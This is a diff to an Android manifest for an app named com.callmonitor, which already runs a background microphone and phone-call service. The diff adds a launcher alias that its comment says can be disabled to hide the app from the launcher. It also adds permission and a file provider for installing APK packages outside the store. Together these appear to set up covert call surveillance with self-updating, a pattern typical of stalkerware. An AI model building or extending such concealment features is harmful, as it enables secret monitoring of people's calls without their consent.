@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.callmonitor"
-    android:versionCode="1"
-    android:versionName="1.0" >
+    android:versionCode="2"
+    android:versionName="1.1" >
 
     <uses-sdk
         android:minSdkVersion="26"
@@ -40,6 +40,9 @@
     <!-- Notifications -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
+    <!-- Install packages (for OTA updates) -->
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+
     <permission
         android:name="com.callmonitor.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
         android:protectionLevel="signature" />
@@ -62,12 +65,18 @@
             android:name="com.callmonitor.MainActivity"
             android:exported="true"
             android:theme="@style/Theme.CallMonitor" >
+        </activity> <!-- Launcher alias - can be disabled to hide app from launcher -->
+        <activity-alias
+            android:name="com.callmonitor.LauncherAlias"
+            android:enabled="true"
+            android:exported="true"
+            android:targetActivity="com.callmonitor.MainActivity" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- Call Receiver -->
         <receiver
@@ -106,6 +115,16 @@
             android:foregroundServiceType="microphone|phoneCall"
             android:stopWithTask="false" />
 
+        <!-- FileProvider for APK installation -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="com.callmonitor.provider"
+            android:exported="false"
+            android:grantUriPermissions="true" >
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
         <provider
             android:name="androidx.startup.InitializationProvider"
             android:authorities="com.callmonitor.androidx-startup"
